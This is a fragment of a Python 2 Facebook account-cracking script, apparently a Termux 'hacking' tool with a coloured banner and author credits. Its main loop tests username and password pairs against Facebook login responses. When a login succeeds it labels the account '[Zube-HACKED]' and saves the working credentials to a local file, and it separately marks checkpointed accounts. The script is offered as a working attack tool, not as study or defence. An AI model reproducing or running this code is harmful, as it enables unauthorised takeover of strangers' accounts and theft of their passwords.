#Tools Created By Zubair Afridi
#Talha Zube Tech
#The Decoder Of Pakistan
...
print("""
\033[0;94m      _________    |         |   ______   ______
\033[0;94m             /     |         |   |    |   |
\033[0;96m           /       |         |   |____|   |_____
\033[0;96m         /         |         |   |    |   |
\033[0;96m       /________   |_ _ _ _ _|   |____|   |_____
""")

print("\033[0;91mThis Tool's Free By Zubair Afridi")
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : Zubair Afridi'
    print '\033[0;94mFACEBOOK : Termux teacher Zubair'
    print '\033[0;96mGITHUB   : Opzubair'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Zube-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[Zube-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
